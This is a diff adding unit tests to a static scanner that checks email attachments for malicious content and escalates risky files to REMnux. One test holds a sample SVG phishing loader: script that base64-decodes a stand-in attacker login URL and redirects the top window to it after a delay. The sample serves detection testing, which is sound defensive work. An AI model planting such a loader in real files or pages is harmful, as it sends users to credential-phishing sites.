@@ -9,7 +9,7 @@ TOOLS = Path(__file__).resolve().parents[1] / "engine"
 sys.path.insert(0, str(TOOLS))
 
 from common import sha256_bytes
-from static_scan import compact, scan_case, scan_pdf
+from static_scan import compact, scan_bytes, scan_case, scan_pdf
 
 
 def make_pdf(body: bytes, stream: bytes | None = None) -> bytes:
@@ -96,6 +96,46 @@ class StaticScanTests(unittest.TestCase):
         self.assertEqual(report["integrity_alerts"], ["good.pdf", "lost.pdf"])
         self.assertEqual(report["escalate_to_remnux"], ["bad.pdf", "lost.pdf"])
         self.assertEqual(compact(report)["files"][0]["flags"], ["Launch"])
+
+    def test_svg_redirect_loader_is_high_and_decodes_atob(self):
+        svg = (b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
+               b'<a id="auto_link" href="https://short.example.test/abc" target="_top"><rect/></a>'
+               b'<script type="text/javascript"><![CDATA[ setTimeout(function(){ var t = atob('
+               b'"aHR0cHM6Ly9ldmlsLmV4YW1wbGUudGVzdC9sb2dpbg=="); window.top.location.href = t; }, 10000); ]]>'
+               b'</script><desc>relleno</desc></svg>')
+        result = scan_bytes(svg, "unknown")
+        self.assertEqual(result["status"], "scanned")
+        self.assertEqual((result["format"], result["risk"]), ("svg", "high"))
+        self.assertIn("script", result["flags"])
+        self.assertIn("base64_decode", result["flags"])
+        self.assertIn("redirect", result["flags"])
+        self.assertIn("https://evil.example.test/login", result["decoded_base64"])
+        self.assertIn("https://evil.example.test/login", result["uris"])
+        self.assertIn("https://short.example.test/abc", result["uris"])
+        self.assertNotIn("http://www.w3.org/2000/svg", result["uris"])
+
+    def test_static_svg_without_active_content_is_low(self):
+        result = scan_bytes(b'<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>', "unknown")
+        self.assertEqual((result["status"], result["risk"], result["flags"], result["uris"]),
+                         ("scanned", "low", [], []))
+
+    def test_active_types_without_local_scanner_escalate(self):
+        with tempfile.TemporaryDirectory() as tmp:
+            case = Path(tmp)
+            (case / "extracted").mkdir()
+            (case / "attachments").mkdir()
+            files = {"001_a.docm": b"PK\x03\x04macro", "002_b.png": b"\x89PNG\r\n\x1a\nx", "003_c.lnk": b"L\x00\x00\x00"}
+            rows = []
+            for index, (stored, data) in enumerate(files.items(), 1):
+                (case / "attachments" / stored).write_bytes(data)
+                rows.append({"index": index, "original_name": stored[4:], "stored_name": stored, "status": "extracted",
+                             "sha256": sha256_bytes(data),
+                             "magic_type": "zip_container" if data.startswith(b"PK") else "png" if b"PNG" in data else "unknown"})
+            (case / "extracted" / "attachments.json").write_text(json.dumps(rows), encoding="utf-8")
+            report = scan_case(case, msg_loader=lambda c: ({}, None))
+        self.assertEqual(report["escalate_to_remnux"], ["a.docm", "c.lnk"])
+        self.assertEqual(report["overall_risk"], "incomplete")
+        self.assertEqual({f["name"] for f in compact(report)["files"]}, {"a.docm", "c.lnk"})
 
 
 if __name__ == "__main__":
